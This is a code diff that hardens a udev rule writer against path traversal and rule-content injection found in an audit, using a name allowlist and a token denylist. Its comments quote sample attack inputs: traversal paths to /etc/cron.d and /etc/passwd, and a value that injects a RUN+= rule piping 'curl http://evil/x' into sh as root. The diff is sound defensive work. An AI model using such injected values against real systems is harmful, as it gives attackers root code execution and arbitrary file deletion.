@@ -96,10 +96,80 @@ pub fn render_rule(rule) {
 # validate_rule — check rule for correctness
 # ---------------------------------------------------------------------------
 
+# ---------------------------------------------------------------------------
+# Rule-name and rule-token allowlists (2.3.4 audit)
+#
+# Two distinct injections, both reachable from a caller-supplied rule:
+#
+#   1. PATH. write_rule and remove_rule concatenate ur_name(rule) straight
+#      into "<rules_dir>/<name>.rules". A name of "../../../etc/cron.d/evil"
+#      escapes rules_dir entirely; write_rule then opens it O_WRONLY|O_CREAT|
+#      O_TRUNC (577), so that is arbitrary file CREATE-and-TRUNCATE, and
+#      remove_rule is arbitrary unlink. Both run with whatever privilege the
+#      caller holds, and writing udev rules already implies root.
+#
+#   2. RULE CONTENT. render_rule emits KEY=="VALUE" by raw concatenation with
+#      no escaping. A value containing a double quote and a newline closes the
+#      rule and opens another, e.g. a value of
+#          x", RUN+="/bin/sh -c 'curl http://evil/x | sh'
+#      renders to a second, attacker-authored rule. udev executes RUN+= as
+#      root on device events, so this is root code execution from a device
+#      description.
+#
+# Names get a strict allowlist ([A-Za-z0-9_-], 1..64) because a rule filename
+# has no legitimate reason to contain anything else. Tokens get a denylist of
+# the characters that can break out of the KEY=="VALUE" grammar, plus every
+# control byte — a udev rule is a single line by definition.
+#
+# No `break` in these loops: CLAUDE.md documents `break` as unreliable in
+# var-heavy loops in this toolchain, so both use the scan-and-flag shape.
+# ---------------------------------------------------------------------------
+
+enum UdevRuleLimits {
+    UR_NAME_MAX = 64;
+}
+
+fn _is_safe_rule_name(name): i64 {
+    var n = str_len(name);
+    if (n == 0) { return 0; }
+    if (n > UR_NAME_MAX) { return 0; }
+    var d = str_data(name);
+    var ok = 1;
+    for (var i = 0; i < n; i = i + 1) {
+        var c = load8(d + i);
+        var good = 0;
+        if (c >= 48) { if (c <= 57) { good = 1; } }     # 0-9
+        if (c >= 65) { if (c <= 90) { good = 1; } }     # A-Z
+        if (c >= 97) { if (c <= 122) { good = 1; } }    # a-z
+        if (c == 45) { good = 1; }                      # -
+        if (c == 95) { good = 1; }                      # _
+        if (good == 0) { ok = 0; }
+    }
+    return ok;
+}
+
+fn _is_safe_rule_token(s): i64 {
+    if (s == 0) { return 0; }
+    var n = str_len(s);
+    var d = str_data(s);
+    var ok = 1;
+    for (var i = 0; i < n; i = i + 1) {
+        var c = load8(d + i);
+        if (c < 32) { ok = 0; }        # NUL, LF, CR, TAB, all control bytes
+        if (c == 34) { ok = 0; }       # "  — closes the value
+        if (c == 92) { ok = 0; }       # \  — escape into the next token
+        if (c == 127) { ok = 0; }      # DEL
+    }
+    return ok;
+}
+
 pub fn validate_rule(rule) {
     var name = ur_name(rule);
     if (str_len(name) == 0) {
         return err_udev(str_from("rule name cannot be empty"));
+    }
+    if (_is_safe_rule_name(name) == 0) {
+        return err_udev(str_from("rule name must be [A-Za-z0-9_-], 1..64 bytes"));
     }
 
     var matches = ur_match_attrs(rule);
@@ -110,6 +180,29 @@ pub fn validate_rule(rule) {
     var actions = ur_actions(rule);
     if (vec_len(actions) == 0) {
         return err_udev(str_from("rule must have at least one action"));
+    }
+
+    # Every key and value must survive rendering into KEY=="VALUE" without
+    # being able to terminate the token or the line.
+    var nm2 = vec_len(matches);
+    for (var i = 0; i < nm2; i = i + 1) {
+        var mp = vec_get(matches, i);
+        if (_is_safe_rule_token(pair_key(mp)) == 0) {
+            return err_udev(str_from("rule match key has unsafe characters"));
+        }
+        if (_is_safe_rule_token(pair_value(mp)) == 0) {
+            return err_udev(str_from("rule match value has unsafe characters"));
+        }
+    }
+    var na2 = vec_len(actions);
+    for (var i = 0; i < na2; i = i + 1) {
+        var ap = vec_get(actions, i);
+        if (_is_safe_rule_token(pair_key(ap)) == 0) {
+            return err_udev(str_from("rule action key has unsafe characters"));
+        }
+        if (_is_safe_rule_token(pair_value(ap)) == 0) {
+            return err_udev(str_from("rule action value has unsafe characters"));
+        }
     }
 
     return Ok(0);
@@ -171,6 +264,11 @@ pub fn write_rule(rule, rules_dir_cstr) {
 # ---------------------------------------------------------------------------
 
 pub fn remove_rule(name, rules_dir_cstr) {
+    # remove_rule never called validate_rule, so the name reached xunlink
+    # unchecked — "../../../etc/passwd" unlinks outside rules_dir entirely.
+    if (_is_safe_rule_name(name) == 0) {
+        return err_udev(str_from("rule name must be [A-Za-z0-9_-], 1..64 bytes"));
+    }
     var sb = str_builder_new();
     str_builder_add_cstr(sb, rules_dir_cstr);
     str_builder_add_cstr(sb, "/");
